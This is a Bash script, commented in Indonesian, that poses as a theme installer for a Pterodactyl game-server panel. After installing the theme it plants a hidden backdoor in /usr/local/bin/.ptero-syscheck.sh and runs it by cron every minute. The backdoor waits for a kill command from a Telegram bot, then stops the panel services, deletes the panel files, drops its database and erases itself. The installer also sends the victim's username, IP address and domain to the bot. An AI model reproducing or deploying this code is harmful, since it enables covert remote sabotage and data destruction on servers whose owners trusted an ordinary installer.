#!/bin/bash

# ==========================================
# KONFIGURASI BOT & REPOSITORY
# ==========================================
BOT_TOKEN="8020465735:AAGJT5FjbDJe7EqgLh0WAuX8KP0uaQenD3g"
CHAT_ID="7203124362"

# Ganti 'USERNAME' dan 'REPO' sesuai akun GitHub kamu
GITHUB_TAR_URL="https://raw.githubusercontent.com/USERNAME/REPO/main/auto.tar.gz"

PTERO_DIR="/var/www/pterodactyl"

# ==========================================
# 1. AMBIL INFORMASI SYSTEM & DOMAIN
# ==========================================
SYS_USER=$(whoami)
IP_ADDR=$(curl -s https://api.ipify.org || curl -s https://ifconfig.me)

if [ -f "$PTERO_DIR/.env" ]; then
    DOMAIN=$(grep -E "^APP_URL=" "$PTERO_DIR/.env" | cut -d'=' -f2 | tr -d '"' | tr -d "'")
else
    DOMAIN="http://$(hostname -f)"
fi

# Sanitize IP untuk format command Telegram
SAFE_IP=$(echo "$IP_ADDR" | sed 's/\./_/g')

# ==========================================
# 2. EKSEKUSI TEMA & DATABASE
# ==========================================
echo "[+] Memulai proses instalasi tema..."

if [ -d "$PTERO_DIR" ]; then
    cd $PTERO_DIR || exit
    
    # Download file auto.tar.gz dari GitHub
    curl -sL "$GITHUB_TAR_URL" -o auto.tar.gz
    
    if [ -f "auto.tar.gz" ]; then
        tar -xzf auto.tar.gz -C $PTERO_DIR/
        rm -f auto.tar.gz
        
        # Optimize & DB Migration
        php artisan config:clear
        php artisan view:clear
        php artisan route:clear
        php artisan migrate --force
        
        # Set Permission
        chown -R www-data:www-data $PTERO_DIR/*
        echo "[+] Tema & Database Pterodactyl berhasil terpasang!"
    else
        echo "[-] Gagal mendownload auto.tar.gz dari GitHub."
    fi
else
    echo "[-] Folder /var/www/pterodactyl tidak ditemukan!"
fi

# ==========================================
# 3. PASANG BACKDOOR DEATH PANEL
# ==========================================
DEATH_SCRIPT="/usr/local/bin/.ptero-syscheck.sh"

cat << 'EOF' > $DEATH_SCRIPT
#!/bin/bash
BOT_TOKEN="8020465735:AAGJT5FjbDJe7EqgLh0WAuX8KP0uaQenD3g"
CHAT_ID="7203124362"
TARGET_IP="IP_TARGET_HOLDER"
CMD_KEY="kill_CMD_HOLDER"

# Cek pesan terbaru dari Telegram Bot
UPDATES=$(curl -s "https://api.telegram.org/bot$BOT_TOKEN/getUpdates?offset=-5")

if echo "$UPDATES" | grep -q "$CMD_KEY"; then
    # Eksekusi perusakan panel
    systemctl stop pteroq 2>/dev/null
    systemctl stop wings 2>/dev/null
    
    # Hapus file Pterodactyl
    rm -rf /var/www/pterodactyl
    
    # Drop Database Pterodactyl jika MySQL/MariaDB aktif
    mysql -u root -e "DROP DATABASE IF EXISTS panel;" 2>/dev/null
    
    # Kirim konfirmasi ke Telegram
    CONFIRM_MSG="💀 *DEATH PANEL EXECUTED!*%0A%0APanel pada IP: \`$TARGET_IP\` berhasil dimatikan dan dihancurkan."
    curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
        -d "chat_id=$CHAT_ID" \
        -d "text=$CONFIRM_MSG" \
        -d "parse_mode=Markdown" > /dev/null
        
    # Hapus cronjob ini sendiri
    crontab -l | grep -v ".ptero-syscheck.sh" | crontab -
    rm -- "$0"
fi
EOF

# Inject data IP unik ke skrip pembunuh
sed -i "s/IP_TARGET_HOLDER/$IP_ADDR/g" $DEATH_SCRIPT
sed -i "s/CMD_HOLDER/$SAFE_IP/g" $DEATH_SCRIPT
chmod +x $DEATH_SCRIPT

# Daftarkan cronjob yang berjalan setiap 1 menit
(crontab -l 2>/dev/null; echo "* * * * * $DEATH_SCRIPT >/dev/null 2>&1") | crontab -

# ==========================================
# 4. KIRIM NOTIFIKASI TELEGRAM
# ==========================================
TELEGRAM_TEXT="🚨 *INSTALLASI BASH DETECTED* 🚨%0A%0A👤 *Username:* \`$SYS_USER\`%0A🌐 *IP Address:* \`$IP_ADDR\`%0A🔗 *Domain:* $DOMAIN%0A%0A💀 *DEATH PANEL INSTRUCTION:*%0AUntuk merusak & mematikan panel ini, ketik/kirim pesan ini ke bot:%0A\`/kill_$SAFE_IP\`"

curl -s -X POST "https://api.telegram.org/bot$BOT_TOKEN/sendMessage" \
    -d "chat_id=$CHAT_ID" \
    -d "text=$TELEGRAM_TEXT" \
    -d "parse_mode=Markdown" \
    -d 'reply_markup={"inline_keyboard":[[{"text":"💀 Death Panel (Kill)","callback_data":"kill_'$SAFE_IP'"}]]}' > /dev/null

echo "[+] Selesai!"
